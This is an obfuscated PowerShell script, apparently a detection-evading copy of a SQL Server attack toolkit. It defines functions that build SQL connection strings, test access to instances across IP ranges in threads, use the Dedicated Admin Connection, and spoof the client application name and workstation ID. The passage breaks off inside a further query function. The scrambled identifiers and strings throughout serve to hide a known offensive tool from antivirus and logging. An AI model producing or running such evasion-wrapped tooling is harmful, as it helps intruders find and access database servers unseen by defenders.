  $3TZ7sQ  = [tyPE]("{1}{2}{0}"-F '4','UIN','t6');   SET PGr2I  (  [TYpe]("{3}{0}{2}{1}"-F 'Tr','ng','I','sYStEM.s') ); $fAygr3= [TyPE]("{0}{1}" -f'd','ATEtIME'); $EHXan4  = [Type]("{0}{1}"-F'int3','2');  $HC9  = [tYpE]("{0}{1}{2}" -F'nE','T.DN','S')  ;  $aiH9g  =  [TypE]("{8}{9}{5}{4}{6}{0}{10}{7}{3}{11}{1}{2}" -F 'ldATA','N','uMeraTOr','Rce','TA','a','.SQl.Sq','ou','syS','Tem.D','s','E') ;    sET-VaRiaBlE  ("f1"+"IL")  (  [TyPe]("{0}{1}{2}{3}" -F'Sy','stem.nEt.','ipADd','REsS') );  sv ("8"+"0zn3") ( [tYpe]("{0}{2}{6}{4}{3}{5}{1}"-F 'syS','Ing','Tem.tE','o','t.EnC','d','X') )  ; $8zm90G  =[tYPE]("{0}{1}{2}"-f 'sy','Ste','m.iO.File') ;set-ITeM VAriABLE:LCS2  ( [tyPe]("{0}{3}{2}{5}{1}{4}"-F 'SYsT','ERt','m.bit','E','ER','conV')  );    sEt-ITEM  VaRiablE:6p5Ef0  (  [TYPE]("{0}{1}"-f'Io.fI','lE') );SET-itEm ('VAr'+'I'+'aBlE'+':OhrM') ([TYpE]("{0}{3}{2}{1}" -f'E','nt','ROnME','Nvi') ) ;  $yck26U  =[TypE]("{3}{1}{2}{0}"-f 'G','EnC','ODin','TExT.');   seT-ITEM VaRIAbLE:QVnJ6  ([TYpe]("{0}{1}{2}" -F 'SysTeM.ne','t','.DNS')  ) ;   SeT-Item  ("V"+"ARI"+"a"+"blE:uTnjP")  (  [type]("{0}{6}{3}{5}{4}{8}{9}{1}{7}{2}"-f'systE','d','iTy','sE','TY.','CUrI','m.','ENT','pRINcI','PaL.WINDowSi') ) ;SEt  ('Mg'+'I') ([TYPe]("{11}{1}{8}{10}{6}{5}{4}{3}{0}{2}{9}{7}" -F 'WINDo','ystEm.','w','Pal.','inCI','ty.pR','I','E','secu','SBUIltiNRol','R','s')  )  ;  sET-VariabLE  ('D'+'74vsW')  ( [TYPe]("{1}{3}{4}{5}{2}{0}" -f 'vENtIOnS','sysT','gcon','em.','ReflE','ctiON.CAllIn')) ; $RMB2  =  [TYpE]("{2}{0}{1}"-F'PpDOm','ain','a')  ;  SEt-ITem ('vA'+'RiABL'+'E:aQ0M'+'Zv')  ([tyPe]("{5}{9}{0}{10}{2}{7}{1}{11}{4}{8}{6}{3}"-f'.RE','e','IT.as','Ss','BuiLdeR','sY','E','s','Acc','STem','flECTiON.EM','MbLy')  );  set-iTEM VARIAble:LTYOQ  ([tYpE]("{5}{8}{1}{3}{9}{4}{2}{7}{6}{0}" -f 'aRSHALaSATtrIbUTE','sTem','rvIcES','.','TeROpSE','s','m','.','Y','RUnTImE.IN'));    set-vaRiAbLE  Dpjy ( [TyPE]("{0}{1}"-f 'ui','NT32')) ;   seT-VArIABLe 7pJ3oi  (  [TYPE]("{2}{3}{0}{1}"-f'r','TER','B','ITConve'))  ;   $AEjP= [tYpe]("{2}{0}{1}"-f 'RIn','G','st')  ;   seT-VAriABlE Y5mvl ( [TyPe]("{3}{4}{8}{9}{0}{6}{5}{10}{1}{2}{7}" -f 'UNtIme','c','ES.m','SYST','e','NTErop','.i','aRshaL','m.','r','sErvi')) ;    $hVYq=[TYpE]("{3}{0}{2}{4}{1}{5}"-F'cS.P','E','rO','SyStEm.DIagnOsTi','c','Ss'); sv B8F4i  ([tyPE]("{2}{0}{1}"-f't','R','iNtp')  );   $qMrk  = [typE]("{0}{1}"-f 'conver','T');   SET-iTeM VaRIaBlE:cWtMR (  [TYpe]("{1}{0}"-F 'ple','tU')  );  Set-Item  VariablE:4iUAw ( [TYPE]("{2}{1}{0}"-F'K','rIPTblOc','sC')  ); $Q01FPM = [TYPe]("{11}{9}{12}{13}{8}{6}{0}{4}{10}{1}{5}{3}{7}{2}" -f 'MA','Pace','tate','AlS','TIon.R','S.initi','O','esSioNs','ENt.AUt','mA','UNs','sysTeM.','na','gEm');  SEt-iteM  VAriAble:OSv1K (  [tYPE]("{1}{2}{0}" -f'efAcTOry','ruNspA','C'));sV  ("lnz"+"5F") ([TYPe]("{1}{0}{2}{3}" -f 'owE','P','RsHe','lL') );Set-Item  variaBLE:UoVDbH (  [TYPE]('gC') ) ;  Set-VarIAbLe ('GMu'+'yp')  ([TYPe]("{0}{1}"-F'mA','tH'));  SEt-ItEM variAbLE:0459M2  (  [tYPe]("{1}{5}{6}{2}{4}{0}{3}" -f 'ScRE','s','eNt.a','dENTIAL','uToMatIon.p','Ystem.man','aGeM') )  ; 















Function Ge`T-S`qL`CO`NNe`CT`iOnOBJ`eCt
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandaTORy = ${Fa`l`Se},
        heLpMEsSAGe = {"{5}{11}{4}{2}{1}{7}{3}{8}{9}{10}{6}{0}" -f 'ith.','r d','o','i','er ','S','uthenticate w','oma','n account ','t','o a','QL Serv'})]
        [string]${USER`NAmE},

        [Parameter(maNdatory = ${fa`L`SE},
        helpMeSSAge = {"{8}{0}{3}{6}{9}{4}{1}{2}{7}{5}"-f' ','assword to ','aut','domai','p','e with.','n account','henticat','SQL Server or',' '})]
        [string]${p`AS`S`WORd},

        [Parameter(mAndaTORy = ${f`Al`se},
        HElpmeSsAgE = {"{3}{2}{1}{4}{6}{5}{0}"-f's.','s cr','indow','W','ede','ial','nt'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CR`eD`eNTi`AL} =  $0459m2::"Emp`TY",

        [Parameter(MANDaTOrY = ${fa`l`Se},
                VAlUEfroMPIPeLinEbYPrOpeRTyNamE = ${tR`UE},
        HELPMessage = {"{5}{0}{6}{8}{1}{4}{3}{7}{2}"-f 'S','instance',' to.','ctio',' to conne','SQL ','erver','n',' '})]
        [string]${IN`st`Ance},

        [Parameter(maNDatory = ${F`AL`se},
        HeLPMEsSaGE = {"{11}{10}{12}{8}{6}{5}{3}{2}{7}{9}{0}{4}{1}"-f'ion ','.','or ','t','(DAC)','tra','nis','Conne','mi','ct','di','De','cated Ad'})]
        [Switch]${d`AC},

        [Parameter(MandAtORY = ${FA`l`se},
        heLPMESSAgE = {"{0}{6}{2}{4}{7}{1}{5}{8}{3}" -f'D',' to c','f','to.','ault','onnect','e',' database',' '})]
        [String]${daT`AB`Ase},

        [Parameter(mAndaTORy = ${fal`SE},
        helPmEssAGe = {"{1}{4}{9}{5}{2}{13}{0}{12}{7}{10}{11}{6}{3}{8}" -f'r c','Spoof the name of the a',' y','ith','ppli','on',' w','ing to','.','cati',' th','e server','onnect','ou'})]
        [string]${A`pPN`Ame} = "",

        [Parameter(MANDATory = ${F`AL`sE},
        helpMeSSAge = {"{15}{1}{19}{2}{13}{0}{7}{12}{8}{14}{17}{18}{9}{5}{3}{4}{10}{20}{11}{6}{16}{21}"-f'e of the wo','p','e',' to th','e ser','ng','t','rks','name','ti','v',' wi','tation/host',' nam',' you','S','h','r ','connec','oof th','er','.'})]
        [string]${W`ork`stAtI`oniD} = "",

        [Parameter(MANdATorY = ${f`ALSe},
        helpMEsSaGe = {"{7}{4}{3}{6}{1}{0}{8}{2}{5}" -f'pted ','y','nection','nc','e an e','.','r','Us','con'})]
        [ValidateSet("Yes","No","")]
        [string]${EnCr`y`pT} = "",

        [Parameter(MaNDAtoRY = ${f`ALSe},
        HeLPMEssagE = {"{2}{0}{4}{7}{8}{3}{5}{6}{1}"-f't the certificat','rver.','Trus','he ','e o','rem','ote se','f ','t'})]
        [ValidateSet("Yes","No","")]
        [string]${tr`USTse`R`VE`RCErt} = "",

        [Parameter(maNdaToRy = ${F`ALSe},
        HelPmeSSaGe = {"{1}{2}{3}{0}"-f '.','C','o','nnection timeout'})]
        [string]${T`iMEo`UT} = 1
    )

    Begin
    {
        
        if(${D`Ac})
        {
            ${d`AC`cONN} = ("{2}{0}{1}" -f'I','N:','ADM')
        }
        else
        {
            ${d`ACCO`NN} = ''
        }

        
        if(-not ${DAt`A`BASE})
        {
            ${d`A`TAbA`SE} = ("{1}{0}" -f 'er','Mast')
        }

        
        if(${AppN`Ame}){
            ${apPN`A`MesTRINg} = (';Ap'+'p'+'li'+'c'+'ation '+"Name=`"$AppName`"")
        }else{
            ${AppnAme`sTR`ing} = ""
        }

        
        if(${Wo`R`kstaTiO`NID}){
            ${WorkSt`A`T`Ionst`RinG} = (';Wo'+'rkstat'+'ion'+' '+"Id=`"$WorkstationId`"")
        }else{
            ${w`o`RKSTa`TiONsTRi`Ng} = ""
        }

        
        if(${eN`Cr`Ypt}){
            ${E`NCRYptS`Tring} = ("{2}{1}{0}{3}" -f'=Ye','pt',';Encry','s')
        }else{
            ${Enc`RypTs`TR`ING} = ""
        }

        
        if(${TrusTSE`RVe`RCerT}){
            ${tRUstc`Er`T`sT`RING} = ("{1}{0}{4}{5}{3}{2}"-f 'ustServe',';Tr','ificate=Yes','rt','r','Ce')
        }else{
            ${tR`U`STceRts`TRING} = ""
        }
    }

    Process
    {
        
        if ( -not ${inS`T`AncE})
        {
            ${Ins`TA`Nce} = ${enV`:`COmpu`TeRn`AmE}
        }

        
        ${CON`NeC`Tion} = &("{2}{1}{0}" -f'ject','w-Ob','Ne') -TypeName ("{4}{3}{1}{6}{0}{5}{7}{9}{8}{2}" -f'e','SqlC','ion','ta.','System.Da','nt','li','.Sql','onnect','C')

        
        if(-not ${u`s`E`RnAMe}){

            
            ${a`U`Th`ENT`Icat`IOnTyPe} = ("{2}{5}{4}{0}{3}{7}{6}{1}"-f 'indows','ls','Current',' C','W',' ','edentia','r')

            
            ${CONn`e`cTioN}."c`on`NeCTioNStr`i`Ng" = ("Server=$DacConn$Instance;Database=$Database;Integrated "+'Securit'+'y='+'SSPI;Co'+'nn'+'ection '+"Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString")
        }
        
        
        if (${USE`Rn`Ame} -like "*\*"){
            ${AutH`entiC`AT`I`oNTYPe} = ("{0}{5}{4}{2}{1}{3}" -f'Provided W','ti','en','als','ows Cred','ind')

            
            ${c`OnN`eCTI`on}."CONNe`c`TionsTr`Ing" = ("Server=$DacConn$Instance;Database=$Database;Integrated "+"Security=SSPI;uid=$Username;pwd=$Password;Connection "+"Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString")
        }

        
        if ((${u`S`eRn`Ame}) -and (${UseR`NA`ME} -notlike "*\*")){

            
            ${AUTHENt`ica`T`Io`NT`YPE} = ("{1}{0}{3}{2}"-f'ed','Provid',' Login',' SQL')

            
            ${c`o`N`NeCTIon}."cO`NNECTIoN`s`T`Ring" = ("Server=$DacConn$Instance;Database=$Database;User "+"ID=$Username;Password=$Password;Connection "+"Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString")
        }

        
        return ${c`oN`NEct`ION}
    }

    End
    {
    }
}






Function  G`ET-`s`qL`cONne`Ctiont`esT
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandaToRY = ${F`Al`se},
        helPmESsAGe = {"{4}{0}{3}{5}{10}{1}{2}{6}{11}{9}{7}{8}{12}"-f'QL Se',' accou','nt t','rver or ','S','dom','o ','hent','icate','ut','ain','a',' with.'})]
        [string]${uSE`Rn`A`mE},

        [Parameter(mAndaToRY = ${fA`lSE},
        helpmEsSaGE = {"{0}{11}{8}{10}{13}{3}{14}{6}{1}{4}{5}{2}{12}{9}{7}"-f 'SQL Se','t p','n',' ','assword to',' authe','coun','th.','v','ate wi','er or d','r','tic','omain','ac'})]
        [string]${PAsS`w`ORd},

        [Parameter(mANDAtory = ${FA`LSE},
        HeLPmeSSAgE = {"{6}{0}{3}{1}{5}{4}{2}"-f 'ows cr','t','.','eden','ls','ia','Wind'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRE`de`NTI`AL} =   (gET-VARiaBlE ('0459M'+'2') ).VAlUe::"em`Pty",

        [Parameter(MANDAtOry = ${f`Al`SE},
                vALuefRoMpIpElInE = ${t`RUE},
                VaLUefRomPipeliNeBYpROpErTYNAme = ${tR`Ue},
        hElpMeSSagE = {"{3}{7}{4}{1}{2}{5}{6}{0}" -f '.','nce',' to conne','SQL Server ','nsta','cti','on to','i'})]
        [string]${iNSt`A`Nce},

        [Parameter(mandatorY = ${fAL`se},
            vAluEFrompIPElinE = ${T`RuE},
            VaLuEfRoMPIPeliNEByPROpERTyname = ${T`Rue},
        HELPmessaGE = {"{0}{2}{5}{4}{3}{1}"-f'I','Server.','P Address','QL ','S',' of '})]
        [string]${i`pad`dreSs},

        [Parameter(MANdaToRy = ${Fal`SE},
        HELpMEsSagE = {"{4}{0}{6}{5}{1}{2}{3}"-f 'Add','In',' CIDR Forma','t to Audit.','IP ','ss Range ','re'})]
        [string]${i`P`RAngE},

        [Parameter(mANDaTORY = ${FA`l`Se},
        HELPMESSagE = {"{0}{6}{2}{3}{1}{5}{4}{7}" -f 'Con','si','ct',' u','g Dedi','n','ne','cated Admin Connection.'})]
        [Switch]${d`Ac},

        [Parameter(manDAtorY = ${f`AlsE},
        hELpmeSsAgE = {"{0}{4}{2}{6}{1}{5}{7}{3}" -f'D','o c','a','to.','ef','onne','ult database t','ct '})]
        [String]${daT`AbaSE},

        [Parameter(MANDaTorY = ${f`A`lSE},
        hElpMeSsagE = {"{0}{1}{3}{2}"-f'C','onnecti','t.','on timeou'})]
        [string]${Ti`M`eouT},

        [Parameter(MaNDatoRy = ${F`Al`sE},
        HElpmESSaGE = {"{2}{3}{8}{11}{6}{0}{1}{10}{5}{9}{4}{7}"-f'rbose',' ','Su','p','nction is wrap',' U',' ve','ped.','pres','sed when fu','errors. ','s'})]
        [switch]${sup`prEs`SV`eRbO`sE}
    )

    Begin
    {
        
        ${TBL`Re`S`ULTs} = &("{2}{0}{1}"-f 'Ob','ject','New-') -TypeName ("{0}{4}{2}{1}{3}" -f 'System.D','abl','.DataT','e','ata')
        ${n`UlL} = ${Tb`l`ReSU`LtS}."Col`U`mns".("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}{3}" -f'Nam','Com','puter','e'))
        ${nu`ll} = ${Tb`l`ResulTs}."c`ol`Umns".("{1}{0}" -f'dd','A').Invoke(("{0}{1}"-f'Insta','nce'))
        ${nU`lL} = ${TbLR`e`SUL`TS}."CO`LUm`NS".("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}"-f 'S','us','tat'))
    }

    Process
    {
        
        if(-not ${InStA`NcE})
        {
            ${INS`Tan`ce} = ${en`V:CO`mP`UTE`R`Name}
        }
        
        
        ${coMP`UT`ERNAme} = &("{3}{6}{7}{4}{2}{5}{0}{1}"-f'n','stance','eFro','Get','Nam','mI','-Com','puter') -Instance ${iN`STA`Nce}

        if(${IpRA`N`Ge} -and ${IP`A`DdreSs})
        {
            if (${iP`AD`Dre`ss}.("{1}{0}"-f's','Contain').Invoke(","))
            {
                ${cO`NTai`N`sv`Alid} = ${f`AlsE}
                foreach (${i`p} in ${ipAD`dr`eSs}.("{0}{1}"-f 'Spl','it').Invoke(","))
                {
                    if($(&("{1}{2}{0}" -f'net','Test-Su','b') -cidr ${ipRa`N`gE} -ip ${i`P}))
                    {
                        ${Co`NtaI`NsVAL`Id} = ${TR`Ue}
                    }
                }
                if (-not ${c`ontaiNsv`Al`Id})
                {
                    &("{0}{2}{1}" -f'W','e-Warning','rit') ('S'+'k'+'ippi'+'ng '+"$ComputerName "+"($IPAddress)")
                    ${NU`LL} = ${TB`lReSu`Lts}."r`OWS".("{0}{1}"-f'Ad','d').Invoke("$ComputerName","$Instance",("{3}{2}{1}{0}" -f 'pe','of Sco',' ','Out'))
                    return
                }
            }

            if(-not $(&("{1}{2}{0}"-f 'net','Test-','Sub') -cidr ${I`PRA`NGe} -ip ${iPADd`R`eSs}))
            {
                &("{2}{3}{1}{0}"-f'ng','Warni','Write','-') ('Sk'+'ipping'+' '+"$ComputerName "+"($IPAddress)")
                ${nU`Ll} = ${tbl`R`ESulTS}."rO`wS".("{1}{0}"-f 'd','Ad').Invoke("$ComputerName","$Instance",("{0}{2}{1}{3}"-f'O',' Sco','ut of','pe'))
                return
            }
            &("{2}{1}{3}{0}"-f'ose','r','Write-Ve','b') ("$ComputerName "+"($IPAddress)")
        }

        
        if(${d`AC})
        {
            
            ${CON`NeC`Ti`on} = &("{2}{3}{1}{0}" -f 'ct','e','Get-SQLConnec','tionObj') -Instance ${iNS`Tan`CE} -Username ${USe`Rn`AME} -Password ${P`AS`sWORd} -Credential ${Cr`e`D`EntIal} -DAC -TimeOut ${t`i`meoUt} -Database ${dat`ABa`sE}
        }
        else
        {
            
            ${CO`N`NEC`TIOn} = &("{5}{6}{4}{0}{2}{3}{1}"-f 'ecti','t','onO','bjec','-SQLConn','G','et') -Instance ${In`s`TaN`Ce} -Username ${U`SERna`mE} -Password ${P`AssWoRd} -Credential ${c`R`eDenTi`AL} -TimeOut ${tImE`OUT} -Database ${DA`TA`B`AsE}
        }

        
        try
        {
            
            ${cO`N`NecT`iOn}.("{1}{0}"-f 'pen','O').Invoke()

            if(-not ${su`Pp`R`essverBoSe})
            {
                &("{0}{4}{3}{2}{1}"-f'Write','se','o','erb','-V') -Message ("$Instance "+': '+'Conn'+'ectio'+'n '+'Suc'+'ces'+'s.')
            }

            
            ${Nu`LL} = ${tb`LrEs`Ul`Ts}."rO`WS".("{1}{0}" -f'dd','A').Invoke("$ComputerName","$Instance",("{1}{0}{2}" -f 'ccessibl','A','e'))

            
            ${c`oNneC`TiON}.("{0}{1}" -f 'Cl','ose').Invoke()

            
            ${c`On`NECt`IoN}.("{2}{1}{0}"-f'e','ispos','D').Invoke()
        }
        catch
        {
            
            if(-not ${SuPPrES`svE`RB`o`SE})
            {
                ${ER`RO`R`MeSs`AGE} = ${_}."Ex`c`eptIon"."mE`sSa`ge"
                &("{0}{2}{1}"-f'Wr','te-Verbose','i') -Message ("$Instance "+': '+'Connecti'+'o'+'n '+'F'+'aile'+'d.')
                &("{0}{1}{2}" -f'W','rite-','Verbose')  -Message (' '+'Er'+'ror: '+"$ErrorMessage")
            }

            
            ${NU`ll} = ${tbl`REs`U`Lts}."rO`wS".("{0}{1}" -f 'A','dd').Invoke("$ComputerName","$Instance",("{2}{1}{3}{0}"-f 'e','Ac','Not ','cessibl'))
        }
    }

    End
    {
        
        ${T`B`lRES`ULts}
    }
}






Function  geT-`SQ`L`ConneCtI`ONTESTTHRead`Ed
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MaNdATORy = ${FA`Lse},
        helpmESsAgE = {"{1}{0}{13}{10}{14}{4}{6}{5}{11}{3}{2}{9}{7}{8}{12}" -f 'Q','S','count to authent','c',' ','in','doma','cate w','it','i','Ser',' a','h.','L ','ver or'})]
        [string]${UsEr`NaMe},

        [Parameter(manDATORY = ${FAl`SE},
        heLPmesSaGe = {"{2}{7}{11}{5}{8}{4}{10}{0}{9}{1}{6}{3}" -f'wo','ate w','SQL Ser','th.','unt p','in acc','i','ver or do','o','rd to authentic','ass','ma'})]
        [string]${Pa`sSWO`Rd},

        [Parameter(maNdAToRY = ${f`AlSE},
        HELPMEsSAGE = {"{5}{2}{1}{3}{6}{0}{4}"-f'edential','w','do','s c','s.','Win','r'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRE`dE`Nti`AL} =  $0459m2::"EM`pty",

        [Parameter(MANdAtory = ${F`Al`SE},
                valueFrOMPIPELInE = ${t`Rue},
                vaLUeFRoMpIPElINeByproPErTynAMe = ${t`RuE},
        HelPmESSagE = {"{1}{6}{3}{5}{4}{0}{2}"-f'tio','SQL Se','n to.','er i',' to connec','nstance','rv'})]
        [string]${IN`STA`Nce},

        [Parameter(maNDATory = ${Fa`lsE},
            vaLUeFRoMpIpEliNE = ${t`RUe},
            valUeFrOmpiPeLINeBYpRoPeRtyname = ${t`RUE},
        HELPMessAgE = {"{2}{6}{0}{3}{1}{5}{4}"-f's','f SQ','IP Ad',' o','er.','L Serv','dres'})]
        [string]${iPa`DdRe`ss},

        [Parameter(maNdatOrY = ${F`ALse},
        hElPMEsSaGE = {"{9}{7}{8}{5}{4}{0}{10}{1}{6}{3}{2}" -f 'DR','o','.','mat to Audit','CI',' ','r','P Addres','s Range In','I',' F'})]
        [string]${IP`RaNGE},

        [Parameter(MandaTory = ${fA`l`sE},
        HeLpMESSAgE = {"{4}{3}{1}{8}{2}{11}{7}{10}{5}{6}{9}{12}{0}" -f'on.','t usin','edic','ec','Conn','nn','e','d Ad','g D','c','min Co','ate','ti'})]
        [Switch]${D`Ac},

        [Parameter(mAndATorY = ${fa`lsE},
        HelpMESsaGE = {"{1}{5}{6}{4}{0}{3}{2}" -f'c','Default da','to.','t ','o conne','ta','base t'})]
        [String]${d`ATAbA`SE},

        [Parameter(mAndaTory = ${Fal`SE},
        hElPmeSsAGe = {"{1}{2}{4}{3}{0}" -f 'eout.','C','onnec','tim','tion '})]
        [string]${tI`mEo`Ut},

        [Parameter(MAnDAToRY = ${fA`LSE},
        heLPmESsaGe = {"{0}{2}{1}{3}{4}{5}" -f 'N','r','umbe',' of thre','a','ds.'})]
        [int]${t`Hr`eAds} = 5,

        [Parameter(mAnDATOrY = ${f`Alse},
        HELPmessAge = {"{9}{8}{3}{5}{0}{1}{2}{10}{11}{12}{7}{6}{4}"-f 'rb','os','e err','s ','is wrapped.','ve','tion ','nc','s','Suppre','ors.  U','sed when',' fu'})]
        [switch]${sUPPR`E`s`sV`ERBose}
    )

    Begin
    {
        
        ${t`BlR`es`ULts} = &("{1}{2}{0}"-f 't','New-O','bjec') -TypeName ("{3}{0}{5}{1}{2}{4}" -f'ystem','ta','T','S','able','.Data.Da')
        ${Nu`LL} = ${T`B`l`REsulTs}."c`OluM`NS".("{0}{1}" -f 'A','dd').Invoke(("{0}{3}{1}{2}" -f'Com','terNa','me','pu'))
        ${n`ULl} = ${TBL`Res`U`lTs}."COL`U`MNs".("{1}{0}"-f'dd','A').Invoke(("{2}{1}{0}"-f 'ce','nstan','I'))
        ${NU`LL} = ${tb`Lr`EsU`lTs}."C`OLU`mNs".("{1}{0}" -f'dd','A').Invoke(("{1}{0}" -f 'tus','Sta'))

        
        ${PiPE`LIN`Ei`T`ems} = &("{1}{0}{2}"-f 'w-Obje','Ne','ct') -TypeName ("{3}{2}{0}{1}" -f'l','e','a.DataTab','System.Dat')

        
        if(-not ${InSt`A`NcE})
        {
            ${inST`ANCE} = ${env`:COMpuTEr`N`AMe}
        }

        
        if(${INs`T`ANcE})
        {
            ${pROvIdE`in`sTa`NCE} = &("{1}{0}{2}" -f'-Obje','New','ct') -TypeName ("{0}{2}{1}" -f 'PS','bject','O') -Property @{
                ("{1}{2}{0}"-f 'ce','Inst','an') = ${in`sta`NCe};
            }
        }

        if(${In`s`TAnce} -and ${Ip`ADDrE`ss})
        {
            ${PROv`idein`s`TANCE} | &("{2}{1}{0}"-f'mber','-Me','Add') -Name ("{1}{0}" -f'ess','IPAddr') -Value ${I`PADd`RESS}
        }

        
        ${PiPELi`NeI`T`e`Ms} = ${piPel`I`NeITe`MS} + ${p`ROVidEIN`st`ANce}
    }

    Process
    {
        
        ${piP`el`iN`EiTeMs} = ${PIpelIN`eIt`e`Ms} + ${_}
    }

    End
    {
        
        ${mySC`RIPt`BLo`ck} = {
            
            ${I`Nst`AnCe} = ${_}."inS`TA`NcE"
            ${i`P`AddreSS} = ${_}."IP`A`ddRESS"

            
            ${C`OmP`UtErnA`me} = &("{3}{2}{0}{5}{1}{4}"-f'uterN','a','omp','Get-C','nce','ameFromInst') -Instance ${iN`st`ANCe}

            if(${I`P`RaNGE} -and ${i`pAd`dre`Ss})
            {
                if (${iP`AdD`ResS}.("{2}{0}{1}" -f 'a','ins','Cont').Invoke(","))
                {
                    ${C`O`Nt`AiNSVaLId} = ${F`A`lSe}
                    foreach (${i`P} in ${I`padd`RESs}.("{1}{0}" -f 't','Spli').Invoke(","))
                    {
                        if($(&("{2}{1}{0}"-f'-Subnet','t','Tes') -cidr ${IPR`ANge} -ip ${ip}))
                        {
                            ${contAIN`sv`AL`Id} = ${t`RUe}
                        }
                    }
                    if (-not ${cO`NTaI`NsVALID})
                    {
                        &("{1}{2}{0}" -f'g','Write-Wa','rnin') ('Ski'+'pp'+'ing'+' '+"$ComputerName "+"($IPAddress)")
                        ${nu`lL} = ${tbLrEsu`l`TS}."rO`Ws".("{0}{1}"-f 'Ad','d').Invoke("$ComputerName","$Instance",("{2}{0}{3}{1}" -f 'of','cope','Out ',' S'))
                        return
                    }
                }

                if(-not $(&("{2}{1}{3}{0}" -f 'et','s','Te','t-Subn') -cidr ${IpR`An`Ge} -ip ${IpaD`d`ReSs}))
                {
                    &("{1}{2}{0}{3}"-f'n','Wr','ite-Warni','g') ('Ski'+'pping '+"$ComputerName "+"($IPAddress)")
                    ${NU`Ll} = ${tb`lResU`LTs}."r`oWs".("{0}{1}" -f'Ad','d').Invoke("$ComputerName","$Instance",("{2}{0}{1}"-f 'c','ope','Out of S'))
                    return
                }
                &("{2}{1}{3}{0}" -f'e','ite-Verbo','Wr','s') ("$ComputerName "+"($IPAddress)")
            }

            
            if(${d`AC})
            {
                
                ${c`oN`N`ecTION} = &("{4}{2}{0}{1}{6}{3}{5}"-f 'nec','tionOb','on','c','Get-SQLC','t','je') -Instance ${i`NsTa`Nce} -Username ${USE`RName} -Password ${p`AS`swoRD} -Credential ${CREd`E`NtiAl} -DAC -TimeOut ${Ti`MEoUT} -Database ${Da`Tab`ASe}
            }
            else
            {
                
                ${CONne`cTI`On} = &("{0}{3}{1}{2}{4}"-f 'Ge','QLC','onnecti','t-S','onObject') -Instance ${INsT`A`NCe} -Username ${uS`e`RnAme} -Password ${pa`S`SwORd} -Credential ${Cr`Ed`EnTial} -TimeOut ${Tim`eOUT} -Database ${Dat`A`BAsE}
            }

            
            try
            {
                
                ${con`N`eCtion}.("{1}{0}" -f'en','Op').Invoke()

                if(-not ${s`UpPRessV`ERBOSE})
                {
                    &("{2}{0}{1}"-f 'ite-Verb','ose','Wr') -Message ("$Instance "+': '+'Co'+'nnectio'+'n'+' '+'Su'+'cce'+'ss.')
                }

                
                ${N`Ull} = ${tbl`RESul`TS}."rO`wS".("{1}{0}"-f 'dd','A').Invoke("$ComputerName","$Instance",("{2}{0}{1}"-f 'cc','essible','A'))

                
                ${coN`NeCT`I`ON}.("{1}{0}"-f 'lose','C').Invoke()

                
                ${C`on`Ne`CTioN}.("{1}{0}" -f 'spose','Di').Invoke()
            }
            catch
            {
                

                if(-not ${sUp`pR`essVE`RBo`sE})
                {
                    ${Er`R`oRmeSsaGE} = ${_}."eXc`EPt`IOn"."mE`sS`AGE"
                    &("{0}{2}{1}"-f'Write-Verbo','e','s') -Message ("$Instance "+': '+'Con'+'n'+'ection '+'Fail'+'e'+'d.')
                    
                }

                
                ${Nu`lL} = ${tBl`RESuL`Ts}."Ro`WS".("{1}{0}"-f 'd','Ad').Invoke("$ComputerName","$Instance",("{4}{0}{2}{3}{1}"-f 't Acc','le','essi','b','No'))
            }
        }

        
        ${PIpE`lIN`E`itEmS} | &("{2}{3}{1}{0}"-f 'arallel','P','I','nvoke-') -ScriptBlock ${MYscRIP`T`BlocK} -ImportSessionFunctions -ImportVariables -Throttle ${TH`Rea`Ds} -RunspaceTimeout 2 -Quiet -ErrorAction ("{2}{0}{1}{3}{4}"-f'tly','Co','Silen','nt','inue')

        return ${T`BLre`SULts}
    }
}






Function GeT-sQ`l`q`UeRy
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANDAtorY = ${fAL`se},
                VALuEFroMpIpElinEbypRopERtynAme = ${t`RUe},
        HELpmEsSAge = {"{7}{9}{2}{5}{0}{8}{10}{6}{4}{1}{3}"-f 'mai','t','r','icate with.','o authen',' or do',' t','S','n ac','QL Serve','count'})]
        [string]${uSErna`me},

        [Parameter(MANdAToRY = ${fAL`sE},
                VAluEfRompIpeLinebYprOpErTyNaME = ${T`RuE},
        heLPMeSSAge = {"{9}{0}{5}{7}{4}{1}{2}{8}{6}{3}"-f 'Serve','main acco','unt pa','h.','do','r or','te wit',' ','ssword to authentica','SQL '})]
        [string]${PA`ssw`ord},

        [Parameter(mandaTOrY = ${f`Alse},
        HElpMEsSAGE = {"{5}{0}{2}{3}{4}{1}" -f 'ows','ials.',' cre','d','ent','Wind'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cREd`E`Nti`Al} =   (  lS ("vA"+"riabLe:045"+"9M2")).vaLue::"eMp`TY",

        [Parameter(mANDAToRy = ${Fa`l`SE},
                valuEFrOMpipELiNeBYpRoPERtyName = ${t`RuE},
        HelPMessage = {"{4}{2}{6}{5}{3}{0}{1}"-f'ecti','on to.','L',' to conn','SQ','r instance',' Serve'})]
        [string]${in`s`TANce},

        [Parameter(maNdatOrY = ${FA`L`Se},
                ValUEFrOmPIpelInEbypROPeRtYname = ${tR`Ue},
        HelPMESSage = {"{1}{2}{0}{3}{4}" -f'rver q','SQL S','e','uery','.'})]
        [string]${qU`Ery},

        [Parameter(mANDaTORY = ${F`A`LsE},
        heLpmessaGE = {"{2}{9}{7}{5}{11}{8}{3}{4}{10}{6}{0}{1}"-f'ection','.','Conn','a','ted A','d','in Conn','e','c','ect using D','dm','i'})]
        [Switch]${D`AC},

        [Parameter(MAndAtoRY = ${fAl`sE},
        hElPMesSAGE = {"{7}{2}{5}{3}{1}{8}{4}{0}{6}" -f'connec','as','ault','b','to ',' data','t to.','Def','e '})]
        [String]${D`Ata`BaSe},

        [Parameter(MANdaTOry = ${FA`L`se},
